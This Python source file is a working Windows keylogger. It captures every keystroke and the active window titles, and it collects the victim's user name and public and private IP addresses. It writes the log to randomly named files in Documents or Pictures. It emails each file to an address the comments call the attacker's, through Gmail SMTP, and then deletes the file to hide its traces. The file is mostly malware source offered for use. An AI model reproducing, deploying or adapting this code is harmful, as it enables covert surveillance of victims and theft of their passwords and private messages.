from importlib import import_module
from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket
import win32gui
import smtplib
import config
import win32clipboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading


from requests.api import delete

try:
    publicIP_addrs = requests.get('https://api.ipify.org').text
except Exception:
    publicIP_addrs = 'Coudn\'t capture' 
privateIP_addrs = socket.gethostbyname(socket.gethostname())
user_name = os.path.expanduser('~').split('\\')[2]
datetime = time.ctime(time.time())


# print(user,datetime,privateIP_addrs,publicIP_addrs)
msg = f'[START OF LOGS]\n *~ Date/Time: {datetime}\n *~ User-Profile: {user_name}\n *~ Public-IP: {publicIP_addrs}\n *~ Private-IP: {privateIP_addrs}\n\n'

logged_data = []
#logged_data_clip = []
logged_data.append(msg)
#logged_data_clip.append(msg)

old_app = ''
delete_file = []
#delete_file1 = []

def on_press(key):
    global old_app
    #which app u are using in windows
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if new_app == 'Cortana':
        new_app = 'Windows start menu'
    else:
        pass
    
    if new_app != old_app and new_app != '':
        #if any new app it captures its name and date and time when its open
        logged_data.append(f'[{datetime}] ~ {new_app}\n')
        #logged_data_clip.append(f'[{datetime}] ~ {new_app}\n')
        old_app = new_app
    else:
        pass
    
    #a list of some keys which makes attacker to usderstand which keystrokes is typed
    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

    #appending all keystrokes to a logged_data list 
    key = str(key).strip('\'')
    if key in substitution:
	    logged_data.append(substitution[substitution.index(key)+1])
    else:
	    logged_data.append(key)
        
#def copy_clipboard():
    #global old_app
    #new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    #if new_app == 'Cortana':
    #    new_app = 'Windows start menu'
    #else:
    #    pass
    
    #if new_app != old_app and new_app != '':
	#    logged_data_clip.append(f'[{datetime}] ~ {new_app}\n')
	#    old_app = new_app
    #else:
	#    pass
#    try:
#        win32clipboard.OpenClipboard()
 #       pasted_data = win32clipboard.GetClipboardData()
 #       win32clipboard.CloseClipboard()
        
 #       logged_data_clip.append('\nClipboard data\n' + pasted_data)
 #   except:
 #       pass
    

def write_file(count):
    #file will be created either these two folder which is by default present in windows
    one = os.path.expanduser('~')+'/Documents/'
    two = os.path.expanduser('~')+'/Pictures/'
    list1 = [one, two]
    filepath = random.choice(list1)
    filename = str(count) + 'I' + str(random.randint(1000000,9999999)) + '.txt'
    #filename2 = str(count) + 'I' + str(random.randint(100000,999999)) + '.txt'
    file = filepath + filename
    #file2 = filepath + filename2
    delete_file.append(file)
   # delete_file1.append(file2)
    #wirting in file all the logged_data
    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))
        
#    with open(file2, 'w') as ff:
#        ff.write(''.join(logged_data_clip))

def send_logs():
    count = 0
    
    #enter ur(attacker unused email) email to get all the keystrokes saved in txt format
    fromAddr = 'example123y@gmail.com'
    fromPswd = 'example456'
    toAddr = fromAddr

    MIN = 10
    SECONDS = 60

    time.sleep(10)#pause the whole thread and let the email to send email 
    while(True):
        if len(logged_data) > 1:
            try:
                write_file(count)
                
                #code to email through python
                subject = f'[{user_name}] ~ {count}'
                msg = MIMEMultipart()# used to create the object of message
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = 'Key_Strokes'
                msg.attach(MIMEText(body, 'plain'))#used to name the email
                    
                attachment = open(delete_file[0], 'rb')
                #attachment1 = open(delete_file1[0], 'rb')
                
                    
                filename = delete_file[0].split('/')[2]
                #filename2 = delete_file1[0].split('/')[2]

                part = MIMEBase('application','octect-stream')
                #part1 = MIMEBase('application','octect-stream')
                part.set_payload((attachment).read())
                #part1.set_payload((attachment1).read())
                encoders.encode_base64(part)
                #encoders.encode_base64(part1)
                part.add_header('content-disposition','attachment;filename='+str(filename))
                #part1.add_header('content-disposition','attachment;filename='+str(filename2))
                msg.attach(part)
                #msg.attach(part1)

                text = msg.as_string()
                
                #mailing begins
                s = smtplib.SMTP('smtp.gmail.com', 587)
                s.ehlo()
                s.starttls()
                s.ehlo()
                s.login(fromAddr, fromPswd)
                s.sendmail(fromAddr, toAddr, text)
                attachment.close()
                #attachment1.close()
                s.close()
                
                #deletion begins
                os.remove(delete_file[0])
               # os.remove(delete_file1[0])
                del logged_data[1:]
                #del logged_data_clip[1:]
                del delete_file[0:]
                #del delete_file1[0:]

                count += 1
            except:
                pass

#main function
if __name__=='__main__':
    #threading begins
    t1 = threading.Thread(target=send_logs)
    t1.start()

    #Listening key strokes
    with Listener(on_press=on_press) as listener:
        listener.join()
    
